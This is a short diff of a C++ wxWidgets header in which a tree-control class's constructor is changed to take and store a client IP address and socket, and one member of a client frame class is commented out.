@@ -7,21 +7,29 @@ class MyTreeCtrl : public wxTreeCtrl {
     public:
         //Eventos
         MyTreeCtrl(wxWindow* parent, const wxWindowID id,
-            const wxPoint& pos, const wxSize& size, std::string strID) : wxTreeCtrl(parent, id, pos, size), strClienteID(strID){};
+            const wxPoint& pos, const wxSize& size, std::string _strID, std::string _strIP, SOCKET sck) :
+            wxTreeCtrl(parent, id, pos, size) {
+            strClienteID = _strID;
+            strClienteIP = _strIP; 
+            sckCliente = sck;
+        }
+
         virtual ~MyTreeCtrl() {}
 
         void OnItemActivated(wxTreeEvent& event);
 
         wxAuiNotebook* p_Notebook;
     private:
-        std::string strClienteID = "";
+        std::string strClienteID;
+        std::string strClienteIP;
+        SOCKET sckCliente = INVALID_SOCKET;
         wxDECLARE_EVENT_TABLE();
 };
 
 class FrameCliente : public wxFrame {
     public:
         std::string strClienteID = "";
-        std::string strIP = "";
+        //std::string strIP = "";
         SOCKET sckCliente = INVALID_SOCKET;
 
         FrameCliente(std::string pstrID, SOCKET sckID, std::string strIP);
